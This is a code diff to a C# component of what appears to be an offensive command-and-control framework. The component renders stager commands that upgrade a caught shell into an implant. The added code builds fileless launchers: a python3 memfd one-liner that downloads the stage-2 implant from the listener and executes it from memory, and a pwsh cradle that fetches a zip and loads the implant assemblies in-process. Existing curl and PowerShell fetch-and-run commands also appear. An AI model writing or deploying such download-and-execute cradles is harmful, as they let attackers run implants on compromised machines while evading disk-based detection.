@@ -1,3 +1,5 @@
+using Rod.BuildPipeline.PayloadBuild;
+
 namespace Rod.Transport.Listeners.ShellCatch;
 
 /// <summary>
@@ -5,11 +7,15 @@ namespace Rod.Transport.Listeners.ShellCatch;
 /// into a real implant (architecture.md Sec 5.2, Sec 6, Sec 8). Each
 /// launcher is the standard fetch-and-run shape the stager half of staging
 /// defines -- fetch the stage-2 bytes over the engagement's web listener,
-/// present the deployment credential, run what came back -- expressed in
-/// the shell family the target is known or guessed to have. Pure rendering
-/// of (url, credential, family) into commands: the target-side behavior is
-/// the plain, documented fetch-execute pattern, nothing family-specific
-/// beyond the downloader each OS ships with.
+/// present the deployment credential, run what came back -- expressed in the
+/// shell family the target is known or guessed to have, and picked for the
+/// payload's form factor: the single-file shapes keep the plain
+/// download-and-execute families, the native AOT shape adds the Linux
+/// in-memory family (the bytes run from a memfd, nothing lands), and the dll
+/// shape renders the pwsh cradle that loads the bundle in-process on any
+/// host with a .NET 8+ runtime. Pure rendering of (url, credential, format)
+/// into commands: the target-side behavior is plain, documented
+/// fetch-execute in every family.
 /// </summary>
 public static class ShellUpgradeLaunchers
 {
@@ -17,16 +23,17 @@ public static class ShellUpgradeLaunchers
     public sealed record Launcher(string Id, string Os, string Command);
 
     /// <summary>
-    /// Renders the launcher family for a stage-2 fetch at
-    /// <paramref name="url"/> authorized by <paramref name="secret"/>. Both
-    /// Unix downloaders and the PowerShell downloader are always rendered --
-    /// the fingerprint is a guess, and showing every variant costs the
-    /// operator nothing while a missing one costs a round trip.
+    /// Renders the launcher families for a stage-2 fetch at
+    /// <paramref name="url"/> authorized by <paramref name="secret"/>, for a
+    /// stage-2 built in <paramref name="format"/>. The disk families render
+    /// for every format -- the shell fingerprint is a guess, and a fallback
+    /// that lands a file beats a family that cannot run at all -- while the
+    /// in-memory families render only for the formats that can honor them.
     /// </summary>
-    public static IReadOnlyList<Launcher> Render(string url, string secret)
+    public static IReadOnlyList<Launcher> Render(string url, string secret, ArtifactFormat format)
     {
         const string unixPath = "/tmp/.rod-stage2";
-        return
+        List<Launcher> launchers =
         [
             new Launcher(
                 "unix-curl",
@@ -44,5 +51,46 @@ public static class ShellUpgradeLaunchers
                 "powershell -c \"$p=\\\"$env:TEMP\\rod-stage2.exe\\\";"
                     + $"iwr '{url}' -Headers @{{'X-Stager-Token'='{secret}'}} -OutFile $p; & $p\""),
         ];
+
+        // The AOT binary is the one executable shape that runs from an
+        // anonymous fd (a plain ELF, no self-reference): python3 stages the
+        // fetched bytes in a memfd and execs it through /proc/self/fd -- the
+        // documented fexecve pattern -- so the stage-2 never lands.
+        if (format == ArtifactFormat.NativeAot)
+        {
+            launchers.Add(new Launcher(
+                "unix-python-memfd",
+                "linux",
+                "python3 -c \"import os,urllib.request;"
+                    + $"q=urllib.request.Request('{url}',headers={{'X-Stager-Token':'{secret}'}});"
+                    + "d=urllib.request.urlopen(q).read();"
+                    + "f=os.memfd_create('rod');"
+                    + "os.write(f,d);"
+                    + "os.execv('/proc/self/fd/%d'%f,['Rod.Implant'])\""));
+        }
+
+        // The dll bundle loads whole into a pwsh 7+ process (.NET 8+): the
+        // cradle unpacks the zip in memory, loads the dependency assemblies,
+        // and invokes the entry assembly's entry point -- no byte on disk.
+        if (format == ArtifactFormat.Dll)
+        {
+            launchers.Add(new Launcher(
+                "windows-pwsh",
+                "windows",
+                "pwsh -nop -c \""
+                    + $"$z=(irm '{url}' -Headers @{{'X-Stager-Token'='{secret}'}});"
+                    + "$m=[IO.MemoryStream]::new([byte[]]$z);"
+                    + "$r=[IO.Compression.ZipArchive]::new($m);"
+                    + "foreach($e in $r.Entries|sort Name)"
+                    + "{if($e.Name -like '*.dll' -and $e.Name -ne 'Rod.Implant.dll')"
+                    + "{$s=[IO.MemoryStream]::new();$e.Open().CopyTo($s);"
+                    + "[Void][Reflection.Assembly]::Load($s.ToArray())}};"
+                    + "$s=[IO.MemoryStream]::new();"
+                    + "($r.Entries|where Name -eq 'Rod.Implant.dll').Open().CopyTo($s);"
+                    + "$t=[Reflection.Assembly]::Load($s.ToArray());"
+                    + "$t.EntryPoint.Invoke($null,(,[string[]]@)).Wait()\""));
+        }
+
+        return launchers;
     }
 }
